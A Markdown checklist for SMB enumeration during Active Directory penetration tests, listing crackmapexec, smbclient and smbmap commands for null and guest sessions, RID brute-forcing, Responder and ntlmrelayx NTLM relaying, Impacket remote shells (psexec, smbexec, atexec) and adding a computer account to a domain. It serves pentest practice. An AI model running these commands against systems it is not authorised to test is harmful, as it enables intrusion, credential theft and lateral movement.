# SMB Enumeration - AD Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating SMB (ports 139/445), I realistically expect to:

- [ ] Discover accessible shares (public, hidden, or misconfigured)
- [ ] Identify valid users via RID brute-force or username lists
- [ ] Retrieve password policy and domain/workgroup details
- [ ] Check for SMB signing or encryption requirements
- [ ] Dump sensitive data like SAM, LAPS, or NTDS
- [ ] Relay NTLM hashes (e.g., via Responder + ntlmrelayx)
- [ ] Execute commands remotely (atexec, psexec, smbexec)
- [ ] Add a new machine to the domain (if permissions allow)

---

## ‚úÖ 1. Enumeration Without Credentials

- [ ] **Nmap Enumeration**
    ```bash
    nmap -p 139,445 --script "*smb*" <IP>
    ```

- [ ] **Null/Guest/Anonymous Sessions**
    ```bash
    # Null session
    smbclient -L //<IP>/ -N
    crackmapexec smb <IP> -u '' -p ''

    # Guest account
    smbclient -L //<IP>/ -U guest%
    crackmapexec smb <IP> -u guest -p ''

    # Anonymous/fake accounts
    crackmapexec smb <IP> -u a -p ''
    ```

- [ ] **smbmap without creds**
    ```bash
    smbmap -H <IP>
    ```

- [ ] **CrackMapExec Null Modules**
    ```bash
    crackmapexec smb <IP> -u '' -p '' --shares
    crackmapexec smb <IP> -u '' -p '' --users
    crackmapexec smb <IP> -u '' -p '' --rid-brute
    crackmapexec smb <IP> -u '' -p '' --pass-pol
    ```

- [ ] **Responder & NTLMRelay**
    ```bash
    Responder -I eth0 -A
    python3 ntlmrelayx.py -smb2support -t smb://<IP> -socks
    ```

---

## ‚úÖ 2. Enumeration With Username (No Password)

- [ ] **Try Known Username Without Password**
    ```bash
    smbclient -L //<IP>/ -U knownuser%
    crackmapexec smb <IP> -u knownuser -p ''
    ```

---

## ‚úÖ 3. Enumeration With Credentials

- [ ] **List Shares**
    ```bash
    # smbmap
    smbmap -H <IP> -u john -p 'password123'

    # smbclient
    smbclient -L //test.local/ -I <IP> -U john
    smbclient //test.local/C$ -I <IP> -U john
    ```

- [ ] **CrackMapExec Full Enumeration**
    ```bash
    crackmapexec smb <IP> -u john -p 'password123' --shares --users --groups --local-groups --loggedon-users --sessions --pass-pol --rid-brute
    ```

- [ ] **Password Policy Check**
    ```bash
    crackmapexec smb <IP> -u john -p 'password123' --pass-pol
    ```

- [ ] **RID Brute**
    ```bash
    crackmapexec smb <IP> -u john -p 'password123' --rid-brute
    ```

---

## ‚úÖ 4. Shell Access & Remote Commands

- [ ] **Remote Shells**
    ```bash
    python3 atexec.py test.local/john:password123@<IP> whoami
    python3 smbexec.py test.local/john:password123@<IP>
    python3 psexec.py test.local/john:password123@<IP>
    python3 smbclient.py test.local/john:password123@<IP>
    python3 reg.py test.local/john:password123@<IP> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
    ```

---

## ‚úÖ 5. Post-Exploitation - Add Machine to Domain

- [ ] **Add a Computer to the Domain**
    ```bash
    python3 addcomputer.py -method SAMR -dc-ip <IP> -computer-name testbox -computer-pass Test123! test.local/john:password123
    ```
